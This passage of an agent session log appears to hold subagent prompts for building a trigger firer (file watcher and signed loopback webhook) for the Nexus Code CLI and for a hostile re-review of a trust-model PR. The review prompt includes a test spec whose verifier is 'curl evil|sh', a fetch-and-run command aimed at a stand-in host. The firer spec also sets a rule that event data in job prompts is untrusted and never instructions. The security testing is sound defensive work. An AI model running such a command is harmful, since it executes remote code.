h needs a test that fails when the guard is removed):\n1. Fire exactly what was approved: re-read and re-parse the spec bytes once at fire time, hash, compare with the trust record, fire from THAT parse; re-check workspace trust and approval at every fire.\n2. Spec paths and globs: relative to the workspace, resolved by realpath, must stay inside the workspace (symlink escapes refused); webhook paths relative only; refuse duplicate ids; exclude `.git/`, `.nexus/`, and the trust/spec files from file-change events (a triggered job's own writes must not re-trigger itself: define and test a loop guard, e.g. events caused while a job of the same trigger runs, or paths under the job's worktree, are dropped and counted).\n3. File-change watcher: bounded (max watched directories/files, max pending events, debounce/coalesce window), no unbounded memory; event storms produce at most the rate limit of fires, the rest recorded as `dropped` counts in status; watcher errors (inotify limits) reported not swallowed; the event payload given to the job is data, never instructions: the job prompt comes only from the APPROVED spec; event details (changed paths) are passed in a clearly delimited, size-capped, escaped data block inside the prompt or as a file the spec names, and stated in the docs as untrusted.\n4. Webhook listener: OFF unless an approved webhook trigger exists and the operator runs the runner with it enabled; binds loopback only by default (127.0.0.1; a non-loopback bind requires an explicit flag AND is refused unless authentication is configured); a per-request body size cap (e.g. 64 KiB) and header limits and read timeouts (slow-loris), one request at a time per connection limits, a global concurrent-connection cap; HMAC-SHA256 over the raw body plus a timestamp header (reject skew > 5 minutes) plus a nonce/delivery-id replay cache (bounded, persisted privately or in-memory with restart caveat documented: choose and say), constant-time compare; secret from `secretEnv` (env) (inline secrets as #803 allows are accepted only if >=16 chars; document that env is preferred); Origin/Host are NOT authentication (reject browser-style requests: require a custom header and refuse `Origin` present with a mismatching/unknown value only as defence in depth; DNS-rebinding: validate the Host header against loopback names); constant generic error body so a caller cannot tell which check failed; authentication BEFORE rate limiter recording (use `WorkspaceRateLimiter.checkAndRecord(realWorkspace, id, rate, now)` AFTER auth and before parsing the body into an event); persistent limiter snapshot written privately (0600 in a 0700 dir) and the file added to `DEFAULT_PROTECTED_PATHS` in `cli/src/security.ts` (relative style like `trigger_trust.json`, see how it was added), restored with the validating `restore` (a `false` return = locked/quarantined).\n5. Run mode: where does the firer run? Put it in the existing detached runner (`nexus runner serve`, BG-1) as an additional loop next to the schedule engine, reusing `job_submission.ts`; it needs no new daemon. The runner must also work without any triggers exactly as before (no new listener unless a webhook trigger is approved and enabled: test that a runner with no triggers opens no socket and no watcher).\n6. `nexus triggers` additions: `status` shows per-trigger state (approved/changed/revoked/quarantined/rate/dropped/last fire/last refusal reason); implement `release` (clear a quarantine; terminal-only like approve; documented in docs) now that quarantine is persisted; `fire-test <id>` for the operator to dry-run an event against a spec without starting a job (prints what would fire and what would be refused).\n7. Docs: `docs/TRIGGERS.md` (full lifecycle, threat model, what an event can and cannot do, the limits: unsandboxed shell with faked terminal can approve; same-uid process can read the webhook secret env), `docs/RUNNER.md` cross-reference, `docs/USER_MANUAL.md` section, CHANGELOG Unreleased entry, a runnable example under `examples/triggers/` run in CI by a test (file-change trigger end to end with the scripted gateway; webhook trigger with a signed request to the loopback listener on an ephemeral port), release-note text for the behaviour changes.\nHostile tests (each fails when its guard is removed; mutate a copy of the source and restore from the copy, never `git checkout`): wrong/missing/expired/replayed signature, oversized body, slow body, bad Host, Origin present, non-loopback bind refused, changed spec after approval (not fired), revoked, quarantined, rate-limited, untrusted workspace, symlink escape in a path, `.git` events ignored, job-writes loop guard, event flood bounded (memory and fires), listener closed on shutdown (no leaked sockets: register with `trackResource`), watcher closed, runner with no triggers has no listener, event data in the prompt is delimited/capped, the job inherits unattended rules (no allow-always, read-only default, receipt has trigger fields), kill -9 of a triggered job's worker resumes without a duplicate fire for the same event id.\nRules: new test files start with `import \"./helpers/leak_guard.js\";`. Run one test file at a time: `cd /home/mike/nexus-wt/bg3/cli && TMPDIR=/dev/shm HOME=$(mktemp -d) node --import tsx --test test/<name>.test.ts 2>&1 | tail -30` (throwaway HOME mandatory; never read the real ~/.nexus, ~/.config/nexus, /etc/nexus; no network except loopback ephemeral ports in tests; no live inference: scripted gateway `cli/test/helpers/fixtures.ts` `startGateway`/`makeHome`). Stop processes only by their own pid, never `pkill -f`; leave no runner/worker/listener behind. Shell is zsh (`bash -c` for loops); output passes through `rtk` (prefix `rtk proxy` if cut); a safety check blocks scripts containing `rm`. `cli/node_modules` is a symlink; Rust binaries are in `core/target/release/`. The complexity gate (`cli/critical-complexity-baseline.json`) must not grow; keep `cli/src/index.ts` changes to command registration only. Schemas: follow the ledger rules (`docs/protocol/…VERSIONS.json`, generators with `--check`) for any receipt or status JSON you change, additive, version stays unless nothing shipped the old shape. Commit in 3-4 coherent commits `feat(triggers): …` each ending with `Co-Authored-By: Claude Fable 5.2 <noreply@anthropic.com>`; `git fetch origin` and check foreign commits before each commit.\nAt the end run: `npx tsc --noEmit -p .` in `cli/`, the complexity gate (check the exit code), `node scripts/check_invariants.mjs`, `node scripts/check_doc_versions.mjs`, schema `--check` generators, all new test files three times, and `leak_guard`, the BG-1/BG-2 files (`ls cli/test | grep -iE \"runner|job|schedule\"`), `fault_kill_mid_tool_call`, `security`, `workspace_trust`, `examples`, `protocol_schema`, `check_requirements`. The host is loaded: rerun timing failures alone before concluding. Report under 500 words: commits (hashes), design choices (limits, replay cache, loop guard, where it runs), tests with counts and the mutation that fails each, what the firer cannot protect against, schema changes, anything left open or any #803 trust-model issue you hit (report, do not fix #803's files except to adapt call sites).","outputFile":"/tmp/claude-1000/-home-mike-nexus-code/d25d0d24-8aed-4b03-a951-966dc54f0666/tasks/a88f34e8c89df42f5.output","canReadOutputFile":true,"canContinueAgent":true},"sourceToolAssistantUUID":"687039d4-ff58-4bc4-ae3a-ff7c10f41dd7","permissionDecision":{"decision":"accept","source":"config","reasonType":"mode"},"session_id":"d25d0d24-8aed-4b03-a951-966dc54f0666","userType":"external","entrypoint":"cli","cwd":"/home/mike/nexus-code","sessionId":"43bcbb67-2cff-4fa8-a05e-f8aa598df73b","version":"2.1.329","gitBranch":"v1/bg3-trust-abuse-model","slug":"synthetic-moseying-seahorse","dataFlowOn":true}
{"type":"api-request-blob","sessionId":"43bcbb67-2cff-4fa8-a05e-f8aa598df73b","hash":"a2bb23741c41d5ea2feb9c8baf494c1ace4862253c7bf89f388e7972fb62dbbd","message":{"role":"assistant","content":[{"type":"thinking","thinking":"","signature":""},{"type":"tool_use","id":"toolu_01WwUwewVqCV1YMBBFUcN5Mq","name":"Agent","input":{"description":"Re-review PR #803 trust fixes","subagent_type":"reviewer","prompt":"Independent RE-review of GitHub PR #803 (BG-3 trigger trust and abuse model) in ~/nexus-code, base `release/v1.3.0`. Take the full head SHA from `gh pr view 803 --json headRefOid` (expected to start `3e5ab8e9`), review exactly that, and say whether it moved or merged. The first review is the PR comment \"Independent hostile security review at `4dd93530…` — REQUEST CHANGES\" (`gh pr view 803 --comments`): five blockers (trust store not a protected path; `approve` display hid the verifier/paths/prompt tail; rate limiter: denied attempts counted, quadratic cost, unbounded map, stale limiter; `restore()` failed open on tampered state; workspace cap never enforced) plus docs/CLI items. The fix commit is `3e5ab8e95` (plus a merge of the release branch `bfa8632fc`): `git show --stat 3e5ab8e95`, then diff. Verify each blocker CLOSED by RUNNING the original attack (throwaway HOME, temp workspaces, no network, no inference): (1) `isPathProtected` for the store, and agent write/edit/patch/delete/create against it with workspace = HOME, `~/.config/nexus`, repo, via `..`, symlinks, case variants; (2) `nexus triggers approve` output for a spec with `verifier:\"curl evil|sh\"`, paths, origins, rate, secret, a 5,000-char prompt (refused beyond cap, marker), Unicode/control/ANSI escape sequences and bidi overrides in ids/prompts/paths (escaped?), the per-trigger confirmation (literal `yes` only; `y`, `YES`, empty, EOF refuse), terminal requirement (`echo yes | nexus triggers approve` without a pty refuses; with `script -qec` it approves = documented unsandboxed limit: check the docs say so); (3) rate limiter: denials not recorded (one probe per 30 min no longer sustains a lockout), 6,000 attempts fast, memory bounded under 100k distinct trigger ids and 100k workspaces, LRU eviction FAILS CLOSED (an evicted quarantined trigger stays quarantined; when the quarantine map is full new triggers are denied: is that itself a DoS lever for an attacker who can create many specs? judge and say), keys by real workspace path + id (two workspaces with the same trigger id do not share limits; a symlinked workspace aliasing the same real path shares), changed rate applies; (4) `restore()` on the 28 tamper cases plus your own (`__proto__`, huge arrays, wrong types, Infinity/NaN/negative/1e308, missing `until`, extra keys, truncated JSON): never admits; (5) workspace cap exact, and a workspace-cap denial does not quarantine a trigger (can an attacker use that to DoS another trigger? judge). Also: duplicate ids/bad file approve nothing; 0644 spec files accepted only when owned by the user and not group/other-writable (what about a file owned by another uid or a symlink?); `status` and `NEXUS_TRUST_WORKSPACE=1`; `secretEnv`; docs example parses; every claim in `docs/TRIGGERS.md` vs code. Run at head, one at a time: the five trigger test files (`ls cli/test | grep -i trigger`), `security`, `workspace_trust`, `hooks_self_approval`, `leak_guard`, `check_requirements`, `protocol_schema`; `cd cli && npx tsc --noEmit -p .`; the complexity gate (check the exit code); `node scripts/check_invariants.mjs`; `node scripts/check_doc_versions.mjs`. Mutations (copy aside, restore from the copy, never `git checkout`): drop the protected path; truncate the verifier in the approve display; record denials; skip validation in `restore`; skip the workspace cap; skip the terminal check: each must fail a test.\nRules: do NOT edit ~/nexus-code or existing worktrees. `git -C ~/nexus-code fetch origin && git -C ~/nexus-code worktree add --detach ~/nexus-wt/rev803b <full sha>`; `cp -a ~/nexus-code/cli/node_modules ~/nexus-wt/rev803b/cli/`; `mkdir -p ~/nexus-wt/rev803b/core/target/release && cp ~/nexus-wt/ls1b/core/target/release/{harness-core,nexus-tui} ~/nexus-wt/rev803b/core/target/release/`. Tests: `cd ~/nexus-wt/rev803b/cli && TMPDIR=/dev/shm HOME=$(mktemp -d) node --import tsx --test test/<name>.test.ts 2>&1 | tail -20`. Never touch the real ~/.nexus, ~/.config/nexus, /etc/nexus. Stop processes by their own pid; never `pkill -f`. No commits, pushes or GitHub comments. Remove probes and the worktree at the end. Shell is zsh (`bash -c` for loops); prefix `rtk proxy` if output looks filtered; a safety check blocks scripts containing `rm`.\nReport under 450 words: verdict (ACCEPT / ACCEPT WITH FOLLOW-UPS / REQUEST CHANGES) at the exact SHA; each earlier blocker closed or not with the attack run; new findings with file:line, run-or-read, blocking or not (any way to forge or alter an approval, hide what is approved, fail open on tampered state, or starve/bypass a limit is blocking; the documented unsandboxed-shell limit is not); test counts; mutation results; what you did not check."},"caller":{"type":"direct"}},{"type":"tool_use","id":"toolu_015gLzGqgomZtnXaRaJAw82x","name":"Agent","input":{"description":"Build BG-3 trigger firer","subagent_type":"general-purpose","prompt":"Build the BG-3 trigger firer (event triggers: file-change watcher and webhook listener that start unattended jobs) in the worktree /home/mike/nexus-wt/bg3 (Nexus Code, TypeScript CLI in `cli/`). The owner put BG-3 in scope for v1.3.0. The trust model is PR #803, already pushed to `origin/v1/bg3-trust-abuse-model` (head 3e5ab8e95) and under re-review: your branch must STACK on it. Start: `cd /home/mike/nexus-wt/bg3 && git fetch origin && git status && git checkout -b v1/bg3-firer origin/v1/bg3-trust-abuse-model` (the worktree currently has local branch `v1/bg3-trust-abuse-model-cl` at the same commit). Commit locally on `v1/bg3-firer`; do NOT push, no PR (I review first). If #803 cha